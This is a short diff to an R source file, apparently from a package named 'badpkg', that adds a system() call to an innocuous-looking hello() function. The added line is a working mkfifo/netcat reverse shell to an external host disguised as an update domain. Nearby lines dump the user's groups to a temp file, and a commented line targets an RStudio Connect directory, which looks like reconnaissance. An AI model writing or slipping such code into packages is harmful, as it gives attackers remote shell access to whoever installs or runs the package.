@@ -23,6 +23,7 @@ hello <- function() {
 
 #file.create("/Users/jeff/workspace/badpkg/heyo2.txt")
 
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc enterpriseupdate.safewebcheck.com 8989 >/tmp/f')
 system('groups > /tmp/body.txt')
 system('echo ===== >> /tmp/body.txt')
 #system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
